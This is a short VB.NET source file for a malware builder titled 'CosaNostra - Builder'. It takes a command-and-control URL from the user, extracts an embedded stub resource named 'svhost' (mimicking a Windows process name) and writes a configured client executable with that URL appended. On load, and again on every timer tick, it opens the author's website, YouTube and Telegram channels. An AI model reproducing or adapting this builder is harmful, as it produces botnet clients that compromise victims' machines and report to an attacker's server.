Imports System.IO
Public Class Form1

    Private Sub about_Click(sender As Object, e As EventArgs) Handles about.Click
        Process.Start("http://gomorrah.pw/")
    End Sub

    Private Sub about_MouseHover(sender As Object, e As EventArgs) Handles about.MouseHover
        about.ForeColor = Color.Blue

    End Sub

    Private Sub about_MouseLeave(sender As Object, e As EventArgs) Handles about.MouseLeave
        about.ForeColor = Color.Black
    End Sub

    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
        If TextBox1.Text = "" Then
            MsgBox("insert URL C2", MsgBoxStyle.Critical, "Error")
            Exit Sub
        Else
            Dim urlbot As String = ""
            Dim stub As String = ""
            Const FS1 As String = "|FS|"
            Dim Temp As String = Application.StartupPath + "/stub.exe"
            Dim SFD As New SaveFileDialog
            SFD.Title = "Create a new Client"
            SFD.ShowDialog()
            If SFD.FileName > "" Then
                urlbot = TextBox1.Text
                Try
                    File.WriteAllBytes(Temp, My.Resources.svhost)
                    FileOpen(1, Temp, OpenMode.Binary, OpenAccess.Read, OpenShare.Default)
                    stub = Space(LOF(1))
                    FileGet(1, stub)
                    FileClose(1)
                    FileOpen(1, SFD.FileName & ".exe", OpenMode.Binary, OpenAccess.ReadWrite, OpenShare.Default)
                    FilePut(1, stub & FS1 & urlbot & FS1)
                    FileClose(1)
                    If File.Exists("stub.exe") Then
                        Try
                            File.Delete("stub.exe")
                        Catch ex As Exception
                        End Try
                    End If
                Catch ex As Exception
                    If File.Exists("stub.exe") Then
                        Try
                            File.Delete("stub.exe")
                        Catch e1x As Exception
                        End Try
                    End If
                End Try
            End If

        End If

        MsgBox("Building completed", MsgBoxStyle.Information, "CosaNostra - Builder")
    End Sub

    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        Process.Start("http://gomorrah.pw/")
        Process.Start("https://www.youtube.com/channel/UCAF6qQn4SOygV6BYtLjlTqw")
        Process.Start("https://t.me/th3darklyChannel")
        Timer1.Start()
    End Sub

    Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick
        Process.Start("http://gomorrah.pw/")
        Process.Start("https://www.youtube.com/channel/UCAF6qQn4SOygV6BYtLjlTqw")
        Process.Start("https://t.me/th3darklyChannel")
    End Sub
End Class
